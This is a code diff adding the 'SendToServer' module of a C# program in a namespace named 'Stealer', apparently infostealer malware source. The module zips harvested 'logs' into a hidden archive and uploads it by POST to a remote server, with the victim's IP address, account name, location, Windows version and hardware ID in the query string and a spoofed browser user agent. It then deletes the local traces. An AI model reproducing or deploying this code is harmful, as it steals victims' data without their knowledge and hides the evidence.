@@ -1,0 +1,184 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Net;
+using System.Net.Security;
+using System.Reflection;
+using System.Security.Cryptography.X509Certificates;
+using System.Threading;
+using System.Threading.Tasks;
+
+namespace Stealer.modules
+{
+    public static class SendToServer
+    {
+        private static readonly string path = Program.path;
+        private static readonly string pathToZip = Program.path + ".zip";
+
+        public static void StratSend()
+        {
+            Task.Factory.StartNew(() => CheckFiles()).Wait();
+            Task.Factory.StartNew(() => CreateZipFromLogsRezo()).Wait();
+            Task.Factory.StartNew(() => UploadLogs()).Wait();
+            Task.Factory.StartNew(() => DeleteLogs()).Wait();
+        }
+        private static void CreateZipFromLogsRezo()
+        {
+            if (File.Exists(pathToZip))
+            {
+                File.Delete(pathToZip);
+            }
+            ZipStore.PackedZip(path, path);
+            File.SetAttributes(pathToZip, File.GetAttributes(pathToZip) | FileAttributes.Hidden);
+        }
+        private static void CheckFiles()
+        {
+            string[] directories = Directory.GetDirectories(path);
+            string[] files = Directory.GetFiles(path);
+            try
+            {
+                if ((uint)files.Length > 0U)
+                {
+                    foreach (string str in files)
+                    {
+                        if (new FileInfo(str).Length == 0L)
+                            File.Delete(str);
+                    }
+                }
+                if ((uint)directories.Length <= 0U)
+                    return;
+                foreach (string path1 in directories)
+                {
+                    long sum = 0;
+                    foreach (string PathToFiles in SafeEnumerateFiles(path1, "*.*", SearchOption.AllDirectories))
+                    {
+                        sum += new FileInfo(PathToFiles).Length;
+                        if (sum == 0L)
+                        {
+                            Directory.Delete(path1, true);
+                        }
+                    }
+                }
+            }
+            catch
+            {
+            }
+        }
+        private static bool ValidateRemoteCertificate(object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors error)
+        {
+            return error == SslPolicyErrors.None;
+        }
+        private static void UploadLogs()
+        {
+            string uriString = "[link]";
+			string Windows = Help.Windows();
+			string Time = Help.GetTime();
+			string User = Help.AccountName();
+			string Ip = Location.GetLocation(true);
+			string local = Help.LocationFind();
+            var webClient = new ExtendedWebClient();
+            ServicePointManager.ServerCertificateValidationCallback += new RemoteCertificateValidationCallback(SendToServer.ValidateRemoteCertificate);
+            ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
+            webClient.Proxy = (IWebProxy)null;
+            webClient.Timeout = Timeout.Infinite;
+            webClient.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome / 62.0.3202.94 Safari / 537.36 OPR / 49.0.2725.64");
+            webClient.AllowWriteStreamBuffering = false;
+			if (Program.repeated_logs == true)
+			{
+				webClient.UploadFile(uriString + "index.php?ip=" + Ip + "&user=" + User + "&localation=" + local + "&windows=" + Windows + "&time=" + Time, "POST", SendToServer.pathToZip);
+			}
+			else
+			{
+				string hwid = Help.HWID;
+				webClient.UploadFile(uriString + "index.php?ip=" + Ip + "&user=" + User + "&localation=" + local + "&windows=" + Windows + "&time=" + Time + "&HWID=" + hwid, "POST", SendToServer.pathToZip);
+			}
+        }
+		
+        private static IEnumerable<string> SafeEnumerateFiles(string path, string searchPattern = "*.*", SearchOption searchOption = SearchOption.TopDirectoryOnly)
+        {
+            var dirs = new Stack<string>();
+            dirs.Push(path);
+            while (dirs.Count > 0)
+            {
+                string currentDirPath = dirs.Pop();
+                if (searchOption == SearchOption.AllDirectories)
+                {
+                    try
+                    {
+                        string[] subDirs = Directory.GetDirectories(currentDirPath);
+                        string[] strArray = subDirs;
+                        for (int index = 0; index < strArray.Length; ++index)
+                        {
+                            string subDirPath = strArray[index];
+                            dirs.Push(subDirPath);
+                            subDirPath = null;
+                        }
+                        strArray = null;
+                        subDirs = null;
+                    }
+                    catch (UnauthorizedAccessException)
+                    {
+                        continue;
+                    }
+                    catch (DirectoryNotFoundException)
+                    {
+                        continue;
+                    }
+                }
+                string[] files;
+                try
+                {
+                    files = Directory.GetFiles(currentDirPath, searchPattern);
+                }
+                catch (UnauthorizedAccessException)
+                {
+                    continue;
+                }
+                catch (DirectoryNotFoundException)
+                {
+                    continue;
+                }
+                string[] strArray1 = files;
+                for (int index = 0; index < strArray1.Length; ++index)
+                {
+                    string filePath = strArray1[index];
+                    yield return filePath;
+                    filePath = null;
+                }
+                strArray1 = null;
+                currentDirPath = null;
+                files = null;
+            }
+        }
+        private static void DeleteLogs()
+        {
+            try
+            {
+                Directory.Delete(path, true);
+                File.Delete(pathToZip);
+            }
+            catch { }
+        }
+        public class ExtendedWebClient : WebClient
+        {
+            public int Timeout { get; set; }
+            public new bool AllowWriteStreamBuffering { get; set; }
+
+            protected override WebRequest GetWebRequest(Uri address)
+            {
+                var request = base.GetWebRequest(address);
+                if (request != null)
+                {
+                    request.Timeout = Timeout;
+                    var httpRequest = request as HttpWebRequest;
+                    if (httpRequest != null)
+                    {
+                        httpRequest.AllowWriteStreamBuffering = AllowWriteStreamBuffering;
+                    }
+                }
+                return request;
+            }
+        }
+    }
+}
